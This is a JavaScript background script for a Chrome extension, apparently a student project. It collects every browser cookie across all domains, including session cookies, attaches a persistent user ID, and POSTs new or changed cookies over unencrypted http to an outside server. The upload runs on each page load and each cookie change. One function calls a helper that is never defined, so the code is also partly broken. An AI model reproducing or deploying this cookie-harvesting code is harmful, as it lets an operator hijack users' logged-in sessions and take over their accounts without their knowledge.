let sentCookies = {};
let reducingCalls = false;
const REDUCING_API_CALLS_PERIOD = 30000;

//Enabling the extension to be able to identify specific users
function getOrCreateUserId(callback) {
  chrome.storage.local.get("userId", (data) => {
    let userId = data.userId;
    if (!userId) {
      userId = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
      });
      chrome.storage.local.set({userId: userId}, () => {
        callback(userId);
      });
    } else {
      callback(userId);
    }
  });
}
// using this to get cookies in chrome
function getAllCookiesAsync() {
  return new Promise((resolve, reject) => {
    chrome.cookies.getAll({}, (cookies) => {
      if (chrome.runtime.lastError) {
        reject(chrome.runtime.lastError);
      } else {
        resolve(cookies);
      }
    });
  });
}

// using this to process cookies after some time
async function updateAllCookiesAndSend() {
  try {
    const cookies = await getAllCookiesAsync();
    sendCookiesIfNotOnCooldown(cookies);
  } catch (error) {
    console.error('Error retrieving cookies:', error);
  }
}

// to reduce API calls, and then send cookies to backend
function sendCookiesIfEnoughPeriod(cookies){
  if (!reducingCalls) {
    sendCookiesToServer(cookies)
    reducingCalls = true;
    setTimeout( () => {
      reducingCalls = false;
    }, REDUCING_API_CALLS_PERIOD);
  }
}

// here the cookies are being send
function sendCookiesToServer(cookies) {
  //local storage is used to identify the users
  /*
  chrome.storage.local.get("userId", (data) => {
      let userId = data.userId;
      if (!userId) {
          userId = generateUUID();
          chrome.storage.local.set({userId: userId});
      }
      //console.log("Retrieved userId:", userId);
      const formattedCookies = cookies.map(cookie => ({
          ...cookie,
          userId,
          expirationDate: cookie.expirationDate ? new Date(cookie.expirationDate * 1000).toISOString() : undefined,
          secure: cookie.secure || false,
          session: cookie.session || false
      }));
      */
     getOrCreateUserId((userId) => {
      const formattedCookies = cookies.map(cookie => ({
        ...cookie,
        userId,
        expirationDate: cookie.expirationDate ? new Date(cookie.expirationDate * 1000).toISOString() : undefined,
        secure: cookie.secure || false,
        session: cookie.session || false
    }));

      const newOrUpdatedCookies = formattedCookies.filter(cookie => {
          const cookieId = `${cookie.domain}-${cookie.name}`;
          if (!sentCookies[cookieId] || sentCookies[cookieId] !== cookie.value) {
              sentCookies[cookieId] = cookie.value;
              return true;
          }
          return false;
      });

      if (newOrUpdatedCookies.length > 0) {
          fetch(`http://fyp-danisanchez.onrender.com/api/cookies`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ cookies: newOrUpdatedCookies })
          })
          .then(response => response.json())
          .then(data => console.log("Cookies sent to server:", data))
          .catch(error => console.error('Error sending cookies to server:', error));
      }
  });
}
  
// here the cookies are send to the back end
function getAllCookiesAndSendToServer() {
  chrome.cookies.getAll({}, function(cookies) {
    if (chrome.runtime.lastError) {
      return;
    }
    sendCookiesIfEnoughPeriod(cookies);

  });
}

// use when content scrip is ready
let contentScriptLoaded = false;

chrome.runtime.onMessage.addListener((message, sender) => {
  if (message.action === "contentScriptReady") {
    contentScriptLoaded = true;
  }
});

// using this to update the tabs
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.active && contentScriptLoaded) {
    updateAllCookiesAndSend();
  }
});

//if cookies change
chrome.cookies.onChanged.addListener((changeInfo) => {
  updateAllCookiesAndSend();
});

